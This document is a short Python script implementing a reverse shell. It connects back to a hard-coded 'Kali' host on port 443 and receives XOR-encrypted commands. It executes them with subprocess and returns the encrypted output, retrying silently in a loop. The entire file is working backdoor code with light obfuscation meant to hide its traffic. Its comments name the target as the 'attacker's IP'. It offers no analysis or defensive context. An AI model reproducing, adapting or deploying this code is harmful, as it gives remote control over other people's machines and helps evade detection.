import socket
import subprocess
import os
import time

# XOR encryption key
KEY = b'secretkey'
REVERSE_HOST = "192.168.56.103"  # Kali IP (change this!)
REVERSE_PORT = 443

def xor_encrypt(data):
    return bytes([b ^ KEY[i % len(KEY)] for i, b in enumerate(data)])

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((REVERSE_HOST, REVERSE_PORT))  # Replace with attacker's IP and desired port
            while True:
                data = s.recv(1024)
                if data:
                    command = xor_encrypt(data).decode()
                    if command.lower() == "exit":
                        break
                    else:
                        output = subprocess.getoutput(command)
                        s.send(xor_encrypt(output.encode()))
        except:
            time.sleep(5)
            continue

if __name__ == "__main__":
    connect()
